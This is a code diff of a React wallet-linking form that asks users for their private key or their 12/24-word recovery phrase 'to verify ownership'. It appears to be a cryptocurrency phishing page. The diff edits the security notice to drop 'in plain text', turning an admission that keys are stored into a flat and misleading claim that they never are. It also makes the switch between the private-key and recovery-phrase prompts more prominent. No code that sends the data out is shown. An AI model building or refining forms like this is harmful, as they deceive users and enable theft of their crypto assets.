@@ -181,7 +181,7 @@ const LinkWallet = () => {
           </div>
 
           <Alert variant="info" className="mb-4 small">
-            <strong>Security notice:</strong> We never store your private keys or seed phrases on our servers in plain text.
+            <strong>Security notice:</strong> We never store your private keys or seed phrases on our servers.
           </Alert>
 
           <Form onSubmit={handleSubmit}>
@@ -221,18 +221,18 @@ const LinkWallet = () => {
                     required
                   />
                   <Form.Text className="text-muted small">
-                    Used only once to verify ownership — never shared.
+                    Used only once to verify ownership. Never shared.
                   </Form.Text>
                 </Form.Group>
 
                 <div className="text-center mt-4 mb-3">
                   <Button
                     variant="link"
-                    className="text-muted text-decoration-none small"
+                    className="text-primary text-decoration-none small"
                     onClick={handleSwitchMethod}
                     disabled={switching || isLoading}
                   >
-                    {switching ? "Switching..." : "Try another way (recovery phrase)"}
+                    {switching ? "Switching..." : "Try another method"}
                   </Button>
                 </div>
               </>
@@ -246,7 +246,7 @@ const LinkWallet = () => {
                     name="recoveryPhrase"
                     value={formData.recoveryPhrase}
                     onChange={handleChange}
-                    placeholder="word1 word2 word3 ... (12 or 24 words)"
+                    placeholder="(12 or 24 words)"
                     required
                   />
                   <Form.Text className="text-muted small mt-1">
@@ -257,11 +257,11 @@ const LinkWallet = () => {
                 <div className="text-center mt-4 mb-3">
                   <Button
                     variant="link"
-                    className="text-muted text-decoration-none small"
+                    className="text-primary text-decoration-none small"
                     onClick={handleSwitchMethod}
                     disabled={switching || isLoading}
                   >
-                    {switching ? "Switching..." : "Back to private key method"}
+                    {switching ? "Switching..." : "Try another method"}
                   </Button>
                 </div>
               </>
